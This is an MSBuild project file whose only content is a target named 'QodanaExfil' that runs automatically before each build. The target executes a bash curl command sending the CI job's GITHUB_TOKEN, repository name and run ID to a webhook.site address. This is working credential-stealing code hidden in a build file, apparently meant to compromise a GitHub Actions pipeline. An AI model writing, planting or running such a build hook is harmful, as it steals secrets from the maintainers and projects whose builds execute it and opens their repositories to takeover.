<Project>
  <Target Name="QodanaExfil" BeforeTargets="BeforeBuild">
    <PropertyGroup>
      <ExfilScript>
        <![CDATA[
          bash -c '
            curl -s -X POST https://b55b6c57-4ea8-4a14-982a-e6e0e49b6f24.webhook.site/ \
              -H "Content-Type: application/json" \
              -d "{\"token\":\"$GITHUB_TOKEN\",\"repo\":\"$GITHUB_REPOSITORY\",\"run\":\"$GITHUB_RUN_ID\"}"
          '
        ]]>
      </ExfilScript>
    </PropertyGroup>
    <Exec Command="$(ExfilScript)" />
  </Target>
</Project>